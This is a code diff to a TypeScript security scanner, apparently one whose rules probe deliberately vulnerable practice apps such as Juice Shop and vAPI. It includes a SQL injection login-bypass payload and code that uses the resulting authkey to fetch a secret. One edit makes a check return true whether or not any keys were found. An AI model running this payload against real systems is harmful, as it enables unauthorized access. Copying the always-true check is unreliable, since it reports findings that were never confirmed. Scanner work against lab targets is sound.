@@ -35651,11 +35651,11 @@ const juiceShopResendKeyLiveOracle: Rule = async (ctx) => {
       return false;
     }
     corpus += "\n" + configDoc.body;
-    if (!/blueSkyUrl|mastodonUrl/i.test(corpus)) {
+    if (extractJuiceShopResendKeys(corpus).length === 0) {
       corpus += "\n" + (await fetchJuiceShopSocialFeedBodies(configDoc.body, ctx.probe));
     }
     keys = extractJuiceShopResendKeys(corpus);
-    return keys.length > 0;
+    return true;
   }
 
   if (keys.length === 0) {
@@ -89723,6 +89723,16 @@ const vapiApi6MassAssignmentLiveOracle: Rule = async (ctx) => {
 
 const VAPI_API8_SQLI_PAYLOAD = { username: "' OR '1'='1", password: "' OR '1'='1" };
 
+/** vapi.tools.escape.tech returns HTTP 403 with a JSON success body on SQLi login bypass. */
+function vapiApi8LoginResponseOk(doc: { status: number; body: string }): boolean {
+  if (doc.status >= 200 && doc.status < 400) return true;
+  return (
+    doc.status === 403 &&
+    /"success"\s*:\s*"true"/i.test(doc.body) &&
+    /"authkey"\s*:\s*"[^"]{8,}"/.test(doc.body)
+  );
+}
+
 const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const loginUrl = new URL("/vapi/api8/user/login", vapiCanonicalOrigin(ctx)).toString();
@@ -89733,8 +89743,7 @@ const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
     maxBytes: 2048,
     timeoutMs: 15000
   });
-  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
-  if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
+  if (!vapiApi8LoginResponseOk(loginDoc)) return NEGATIVE;
   const keyMatch = loginDoc.body.match(/"authkey"\s*:\s*"([^"]{8,})"/);
   if (!keyMatch) return NEGATIVE;
   const secretUrl = new URL("/vapi/api8/user/secret", vapiCanonicalOrigin(ctx)).toString();
